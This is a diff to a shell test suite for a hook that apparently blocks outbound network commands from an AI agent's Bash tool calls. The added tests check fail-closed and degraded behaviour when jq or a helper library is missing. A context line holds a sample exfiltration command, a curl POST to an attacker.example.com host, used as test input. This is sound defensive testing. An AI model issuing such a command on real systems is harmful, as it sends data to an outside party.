@@ -359,6 +359,60 @@ echo "off" > "$MODE_FILE"
 test_case "off-mode: curl POST to attacker exits 0 (no log, no block)" \
   "$(bash_payload 'curl -X POST https://attacker.example.com/')" 0
 
+# ----- Missing-jq / missing-helper posture (GHSA-9cjm-v22x-4x33 regression) -----
+# jq resolution now lives in core/hooks/lib/dep-resolve.sh, so simulating a host
+# without jq means sandboxing BOTH files: a copy of the hook PLUS a copy of the
+# helper with all three jq candidate paths (/usr/bin, /opt/homebrew/bin,
+# /usr/local/bin) rewritten to nonexistent locations. This hook is MODE-GATED, so
+# the fail posture is mode-dependent: enforce must DENY (exit 2 — a control that
+# cannot parse its input must not allow), while warn/off DEGRADE to a stderr note
+# + exit 0 (missing jq must not block harder than a rule match would). A missing
+# helper LIBRARY is an install-integrity failure that fails CLOSED (exit 2) in any
+# mode. The sandbox carries its OWN .mode, so this block does not race the shared
+# core/hooks/.mode the rest of this suite mutates.
+_sbx="$(/usr/bin/mktemp -d)"
+/bin/mkdir -p "$_sbx/lib"
+/bin/cp "$HOOK" "$_sbx/block-egress.sh"
+/usr/bin/sed \
+  -e 's#/usr/bin/jq#/nonexistent/jq-a#g' \
+  -e 's#/opt/homebrew/bin/jq#/nonexistent/jq-b#g' \
+  -e 's#/usr/local/bin/jq#/nonexistent/jq-c#g' \
+  "${HOOK_DIR}/lib/dep-resolve.sh" > "$_sbx/lib/dep-resolve.sh"
+/bin/chmod +x "$_sbx/block-egress.sh"
+_jqpayload='{"tool_name":"Bash","tool_input":{"command":"ls"},"cwd":"/tmp"}'
+
+# enforce → fail CLOSED (exit 2 + DEPENDENCY-MISSING)
+/usr/bin/printf 'enforce' > "$_sbx/.mode"
+_jqmiss_exit=0
+_jqmiss_err="$(/usr/bin/printf '%s' "$_jqpayload" | /bin/bash "$_sbx/block-egress.sh" 2>&1 >/dev/null)" || _jqmiss_exit="$?"
+if [ "$_jqmiss_exit" = 2 ] && /usr/bin/printf '%s' "$_jqmiss_err" | /usr/bin/grep -qE 'DEPENDENCY-MISSING'; then
+  /usr/bin/printf 'PASS: jq missing + enforce → fail CLOSED (exit 2 + DEPENDENCY-MISSING)\n'; PASS=$((PASS + 1))
+else
+  /usr/bin/printf 'FAIL: jq missing + enforce → expected exit 2 + DEPENDENCY-MISSING, got exit=%s\n  stderr: %s\n' "$_jqmiss_exit" "$_jqmiss_err"; FAIL=$((FAIL + 1))
+fi
+
+# warn → DEGRADE (exit 0 + DEPENDENCY-DEGRADED)
+/usr/bin/printf 'warn' > "$_sbx/.mode"
+_jqwarn_exit=0
+_jqwarn_err="$(/usr/bin/printf '%s' "$_jqpayload" | /bin/bash "$_sbx/block-egress.sh" 2>&1 >/dev/null)" || _jqwarn_exit="$?"
+if [ "$_jqwarn_exit" = 0 ] && /usr/bin/printf '%s' "$_jqwarn_err" | /usr/bin/grep -qE 'DEPENDENCY-DEGRADED'; then
+  /usr/bin/printf 'PASS: jq missing + warn → DEGRADE (exit 0 + DEPENDENCY-DEGRADED)\n'; PASS=$((PASS + 1))
+else
+  /usr/bin/printf 'FAIL: jq missing + warn → expected exit 0 + DEPENDENCY-DEGRADED, got exit=%s\n  stderr: %s\n' "$_jqwarn_exit" "$_jqwarn_err"; FAIL=$((FAIL + 1))
+fi
+
+# helper missing entirely → fail CLOSED (exit 2 + LIB-MISSING) regardless of mode
+/bin/rm -f "$_sbx/lib/dep-resolve.sh"
+/usr/bin/printf 'off' > "$_sbx/.mode"
+_libmiss_exit=0
+_libmiss_err="$(/usr/bin/printf '%s' "$_jqpayload" | /bin/bash "$_sbx/block-egress.sh" 2>&1 >/dev/null)" || _libmiss_exit="$?"
+if [ "$_libmiss_exit" = 2 ] && /usr/bin/printf '%s' "$_libmiss_err" | /usr/bin/grep -qE 'LIB-MISSING'; then
+  /usr/bin/printf 'PASS: helper missing → fail CLOSED (exit 2 + LIB-MISSING)\n'; PASS=$((PASS + 1))
+else
+  /usr/bin/printf 'FAIL: helper missing → expected exit 2 + LIB-MISSING, got exit=%s\n  stderr: %s\n' "$_libmiss_exit" "$_libmiss_err"; FAIL=$((FAIL + 1))
+fi
+/bin/rm -rf "$_sbx"
+
 # ----- Summary -----
 echo ""
 echo "================================"
